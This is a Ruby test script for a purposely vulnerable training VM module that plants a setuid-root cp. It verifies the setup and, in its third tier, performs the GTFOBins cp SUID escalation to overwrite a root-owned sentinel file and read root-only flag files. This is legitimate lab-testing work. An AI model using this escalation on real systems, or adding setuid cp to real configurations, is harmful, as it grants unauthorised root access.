require_relative '../../../../../lib/post_provision_test'


class SuidRootCpTest < PostProvisionTest
  def initialize
    self.module_name = 'suid_root_cp'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Read facts: strings_to_leak and leaked_filenames. Both are checked below
  # through json_inputs (flag files in /root, mode 0600; contents readable only
  # after escalation). The cp path is fixed in config.pp, so it is not an input.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('cp is a regular file, not a symlink', "stat -c '%F' /usr/bin/cp", 'regular file')
      test_local_command('cp is setuid 4755 owned by root', "stat -c '%a %U' /usr/bin/cp", '4755 root')
      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # How a student finds it: a setuid search as an ordinary user.
      test_local_command('setuid search shows cp', 'find /usr/bin -perm -4000 -name cp 2>/dev/null', '/usr/bin/cp', user: 'nobody')
      test_local_command('ls shows the setuid bit on cp', 'ls -l /usr/bin/cp', '-rwsr-xr-x', user: 'nobody')
      # Control: the flag really is unreadable without cp.
      leaked.each do |f|
        test_local_command("control: unprivileged user cannot read #{f}",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1", 'Permission denied', user: 'nobody')
      end
    end

    # Tier 3: local proof, no Metasploit module exists. As a throwaway user, use
    # the GTFOBins "cp" SUID technique: read with `cp <file> /dev/stdout`, write
    # with `cp /dev/stdin <file>`. A root-owned sentinel file stands in for
    # /etc/passwd so the test cannot damage the VM; it is removed afterwards.
    sentinel = '/etc/secgen_t3_cp_sentinel'
    with_throwaway_ssh_user do |user, _pass|
      begin
        run_vagrant_ssh("printf 'original\\n' > #{sentinel}; chown root:root #{sentinel}; chmod 0644 #{sentinel}")

        # Control: without cp the user cannot write the root-owned file.
        test_local_command('control: user cannot write a root-owned file directly',
                           "{ echo hacked > #{sentinel}; } 2>&1", 'Permission denied', user: user, tier: 3)

        # Arbitrary write as root through the SUID cp, checked as root.
        run_as_user(user, "echo escalated | /usr/bin/cp /dev/stdin #{sentinel}")
        test_local_command('GTFOBins cp SUID: user overwrote a root-owned file',
                           "cat #{sentinel}; stat -c '%U' #{sentinel}", "escalated\nroot", tier: 3)

        # Arbitrary read as root: the flag files.
        strings.each_with_index do |s, i|
          next if s.strip.empty?
          fname = leaked[i] || leaked.first
          next unless fname
          test_local_command("GTFOBins cp SUID: user reads root-only #{fname}",
                             "/usr/bin/cp #{Shellwords.escape("/root/#{fname}")} /dev/stdout",
                             s.strip.lines.first.to_s.strip, user: user, tier: 3)
        end
      ensure
        run_vagrant_ssh("rm -f #{sentinel}")
      end
    end
  end

end

SuidRootCpTest.new.run
